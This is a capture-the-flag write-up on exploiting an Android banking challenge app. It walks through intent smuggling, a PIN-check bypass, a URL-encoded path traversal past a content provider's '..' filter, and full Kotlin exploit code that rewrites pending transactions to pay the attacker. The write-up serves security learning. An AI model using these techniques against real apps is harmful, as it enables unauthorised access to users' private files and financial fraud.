---
ai_date: 2025-08-17 20:46:43
ai_summary: Bypassed pin setup and modified delayed transactions using 'intent smuggling'
  and 'LogProvider' access
ai_tags:
- intent-smuggling
- log-provider
- file-access
created: 2025-08-17T10:37
points: 292
solves: 17
tags:
- fav
title: Sekai Bank - Transaction
updated: 2025-08-17T20:46
---

Delayed transaction are saved in files.

```
vbox86p:/data/data/com.sekai.bank/files/delayed_transactions # ls
9d3823ed-2ac3-4362-8f25-500d355e4408.json
vbox86p:/data/data/com.sekai.bank/files/delayed_transactions # cat 9d3823ed-2ac3-4362-8f25-500d355e4408.json
{"amount":10.0,"createdAt":"2025-08-16 13:32:22.851","fromUserId":"68a0be2c859c362036e7f890","id":"9d3823ed-2ac3-4362-8f25-500d355e4408","message":"wwwww","pin":"123456","scheduledTime":"2025-08-16 13:36:00.000","toUsername":"admin","type":"USER_SCHEDULED"}
```

So if we can modify it somehow.

## First Idea

Make a new app with the package name `com.sekai.bank` and just modify the values.

Didn't work, can't install locally due to signature mismatch and can't install remotely with the error "Invalid APK file!".

## Second Idea

I tried to broadcast `BOOT` but it didn't work and it wont do anything anyways.

## Hacktricks

I followed the link on hacktricks and found this very insightful article.

https://blog.oversecured.com/Android-Access-to-app-protected-components/

> it must be non-exported (otherwise it could be attacked directly, without using the vulnerability we are discussing in this article)
> it must have the android:grantUriPermissions flag set to true.

```xml
<provider
    android:name="com.sekai.bank.providers.LogProvider"
    android:enabled="true"
    android:exported="false"
    android:authorities="com.sekai.bank.logprovider"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/file_paths"/>
</provider>
```

Turns out `LogProvider` fits that description perfectly.

`MainActivity` fits it too, as long as we trigger an error, we can get it to use arbitrary intent defined in `fallback`.

> I realized the intent smuggling myself but did not realize the `LogProvider` could give us file access.

```java
public void onCreate(Bundle bundle) {
	super.onCreate(bundle);
	try {
		this.tokenManager = SekaiApplication.getInstance().getTokenManager();
		if (handlePinSetupFlow()) {
			return;
		}
	} catch (Exception unused) {
		Intent intent = (Intent) getIntent().getParcelableExtra("fallback");
		if (intent != null) {
			startActivity(intent);
			finish();
		}
	}
	if (!this.uiInitialized) {
		checkAuthentication();
	}
}
```

### Pin Bypass

This is pretty simple, just include `from_pin_setup=true` and we can bypass it.

```java
private boolean handlePinSetupFlow() {
	if (!getIntent().getBooleanExtra(FROM_PIN_SETUP_EXTRA, false)) {
		return false;
	}
	this.pinVerified = true;
	setupMainUI();
	return true;
}
```

### Trigger the exception

To actually make Sekai Bank use our intent, we need to trigger an exception in `handlePinSetupFlow`.

But we still need `this.pinVerified` to be `true`.

So it has to be `setupMainUI();`

```java
private void setupMainUI() {
	if (!this.uiInitialized && !isFinishing() && !isDestroyed()) {
		try {
			ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
			this.binding = inflate;
			setContentView((View) inflate.getRoot());
			setupWindowInsets();
			setupNavigation();
			this.uiInitialized = true;
		} catch (Exception unused) {
			startAuthActivity();
		}
		Bundle extras = getIntent().getExtras();
		if (extras != null && extras.containsKey("context")) {
			Toast.makeText((Context) extras.getParcelable("context"), "Hello!", 1).show();
		}
	}
}
```

There is an unchecked cast `(Context) extras.getParcelable("context")`, so we can just put some random data in `context` and it should work.

### Heist

```java
val extra = Intent()
extra.setFlags(
	((Intent.FLAG_GRANT_READ_URI_PERMISSION or
			Intent.FLAG_GRANT_PREFIX_URI_PERMISSION or
			Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
			Intent.FLAG_GRANT_WRITE_URI_PERMISSION))
)
extra.setClassName(packageName, "com.sekai.heist.LeakActivity")
extra.setData("content://com.sekai.bank.logprovider/".toUri())

val intent = Intent()
intent.setComponent(
	ComponentName(
		"com.sekai.bank",
		"com.sekai.bank.MainActivity"
	)
)

intent.putExtra("context", "ww")
intent.putExtra("fallback", extra)
intent.putExtra("from_pin_setup", true)
this.startActivity(intent)
```

### Android Version

I got permission issues with `FLAG_GRANT_READ_URI_PERMISSION` etc because I was on android 36.

I downgraded my android emulator to android 31 and it worked.

### Bypass Filter

There was another issue: `LogProvider` will block `..` and there isn't anything useful in `cache` folder.

```java
if (!uri.toString().contains("..")) {
    File file = new File(getContext().getCacheDir(), uri.getPath());
    if (file.exists()) {
        return ParcelFileDescriptor.open(file, 805306368);
    }
    throw new FileNotFoundException("Log doesn't exists!");
}
```

I got stuck again until I realised that `getPath()` will actually url decode the path, so we could just do this.

```java
extra.setData("content://com.sekai.bank.logprovider/%2e%2e%2ffiles".toUri())
```

### Folders

I was again stuck for extended period of time because I forgot that `LogProvider` will only list files.

```java
for (File file : listFiles) {
	if (file.isFile()) {
		matrixCursor.addRow(new Object[]{Integer.valueOf(i), file.getName(), Long.valueOf(file.length()), file.getAbsolutePath()});
		i++;
	}
}
```

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1755440361/20250817101921293.png/ad0690e857878f080182ccb5768da89e.png)

Stupid mistake tho

## Solution

### The heist

1. Make Sekai Bank grant us permissions to `../files/delayed_transactions`.

```kotlin
package com.sekai.heist

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import androidx.core.net.toUri
import com.sekai.heist.ui.theme.SekaiBankHeistTheme


class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)


        val extra = Intent()
        extra.setFlags(
            ((Intent.FLAG_GRANT_READ_URI_PERMISSION or
                    Intent.FLAG_GRANT_PREFIX_URI_PERMISSION or
                    Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
                    Intent.FLAG_GRANT_WRITE_URI_PERMISSION))
        )
        extra.setClassName(packageName, "com.sekai.heist.LeakActivity")
        extra.setData("content://com.sekai.bank.logprovider/%2e%2e%2ffiles%2fdelayed_transactions".toUri())

        val intent = Intent()
        intent.setComponent(
            ComponentName(
                "com.sekai.bank",
                "com.sekai.bank.MainActivity"
            )
        )

        intent.putExtra("context", "ww")
        intent.putExtra("fallback", extra)
        intent.putExtra("from_pin_setup", true)
        this.startActivity(intent)

        enableEdgeToEdge()
        setContent {
            SekaiBankHeistTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        name = "Android",
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }
    }

    companion object {

    }
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    SekaiBankHeistTheme {
        Greeting("Android")
    }
}
```

### The driveaway

Actually receive the granted access and read the files.

Change every pending transaction to be sent to me, and change the amount of 1 million, _also make them immediate_.

```kotlin
package com.sekai.heist

import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.ui.Modifier
import com.sekai.heist.ui.theme.SekaiBankHeistTheme
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class LeakActivity : ComponentActivity() {
    @SuppressLint("Range")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (intent.data != null) {
            println()
            println()
            println("OWO!!!! IT WORKED!!!")
            println(intent.data)
            println()
            val uri: Uri = intent.data!!
            println("path = ${uri.path}")
            val cursor =
                contentResolver.query(
                    uri,
                    arrayOf<String>("name", "size", "path"),
                    null, null, null
                )
            val b = StringBuilder()
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    val fileName = cursor.getString(cursor.getColumnIndex("name"))
                    println("$fileName:")
                    b.append(fileName).append("\n")
                    try {
                        val fileUri = Uri.withAppendedPath(intent.data, fileName)
                        val `is` = contentResolver.openInputStream(fileUri)
                        val readBytes = `is`?.readBytes()
                        val data = readBytes?.let { String(it) }!!
                        println("\t" + data)
                        b.append("\t" + data).append("\n")
                        val jsonObject = JSONObject(data)
                        jsonObject.put("amount", 1)
                        jsonObject.put("toUsername", "admin")
                        val sdf =
                            SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault())
                        val formattedDate: String? = sdf.format(Date())
                        jsonObject.put("scheduledTime", formattedDate)
                        val bytes = jsonObject.toString().toByteArray(charset("UTF-8"))
                        val os = contentResolver.openOutputStream(fileUri)!!
                        os.write(bytes)
                        os.close()
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
                cursor.close()
                println("thats it")
            } else {
                println("noooo cursor = null")
            }
        }
        val intent = Intent()
        intent.setComponent(
            ComponentName(
                "com.sekai.bank",
                "com.sekai.bank.MainActivity"
            )
        )

        intent.putExtra("context", "ww")
        intent.putExtra("from_pin_setup", true)
        this.startActivity(intent)
        enableEdgeToEdge()
        setContent {
            SekaiBankHeistTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        name = "Leaked Haha",
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }
    }
}
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <application
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.SekaiBankHeist">
        <activity
            android:name=".LeakActivity"
            android:theme="@style/Theme.SekaiBankHeist"
            android:exported="true" />
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:label="@string/app_name"
            android:theme="@style/Theme.SekaiBankHeist">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>

</manifest>
```

Remember to export `LeakActivity`!

## Flag

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1755441273/20250817103433061.png/c9fdba0aa417cfe16101da5e7ef58f99.png)

After some intense waiting, and _not_ getting any flag, I got anxious and tried to test the app again locally but as I was testing the transaction arrived!!!

Loved the challenge!

```flag
SEKAI{so-many-trouble-just-to-steal-a-million}
```